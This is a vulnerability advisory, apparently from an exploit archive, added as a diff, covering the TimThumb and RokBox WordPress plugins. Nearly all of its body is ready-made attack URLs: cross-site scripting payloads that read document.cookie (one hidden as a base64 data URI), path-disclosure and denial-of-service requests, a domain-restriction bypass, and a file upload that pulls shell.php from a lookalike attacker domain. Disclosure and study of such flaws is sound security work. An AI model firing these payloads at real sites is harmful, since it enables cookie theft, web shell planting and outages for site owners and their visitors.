@@ -1,0 +1,65 @@
+source: http://www.securityfocus.com/bid/56953/info
+
+The TimThumb plug-in for WordPress is prone to multiple security vulnerabilities, including:
+
+1. A cross-site scripting vulnerability
+2. Multiple security-bypass vulnerabilities
+3. An arbitrary file-upload vulnerability
+4. An information-disclosure vulnerability
+5. Multiple path-disclosure vulnerabilities
+6. A denial-of-service vulnerability
+
+Attackers can exploit these issues to bypass certain security restrictions, obtain sensitive information, perform certain administrative actions, gain unauthorized access, upload arbitrary files, compromise the application, access or modify data, cause denial-of-service conditions, steal cookie-based authentication credentials, or control how the site is rendered to the user; other attacks may also be possible. 
+
+XSS (WASC-08) (in versions of Rokbox with older versions of TimThumb):
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg
+
+Full path disclosure (WASC-13):
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site/page.png&h=1&w=1111111
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site/page.png&h=1111111&w=1
+
+Abuse of Functionality (WASC-42):
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site&h=1&w=1
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site.flickr.com&h=1&w=1
+(bypass of restriction on domain, if such restriction is turned on)
+
+DoS (WASC-10):
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site/big_file&h=1&w=1
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://site.flickr.com/big_file&h=1&w=1
+(bypass of restriction on domain, if such restriction is turned on)
+
+Arbitrary File Upload (WASC-31):
+
+http://www.example.complugins/wp_rokbox/thumb.php?src=http://flickr.com.site.com/shell.php
+
+Content Spoofing (WASC-12):
+
+In parameter file there can be set as video, as audio files.
+
+http://www.example.complugins/wp_rokbox/thumb.php?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
+http://www.example.complugins/wp_rokbox/thumb.php?file=1.flv&image=1.jpg
+http://www.example.complugins/wp_rokbox/thumb.php?config=1.xml
+http://www.example.complugins/wp_rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=http://site
+
+XSS (WASC-08):
+
+http://www.example.complugins/wp_rokbox/jwplayer/jwplayer.swf?abouttext=Player&aboutlink=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ%2B
+
+Information Leakage (WASC-13):
+
+http://www.example.complugins/wp_rokbox/error_log
+
+Leakage of error log with full paths.
+
+Full path disclosure (WASC-13):
+
+http://www.example.complugins/wp_rokbox/rokbox.php
+
+
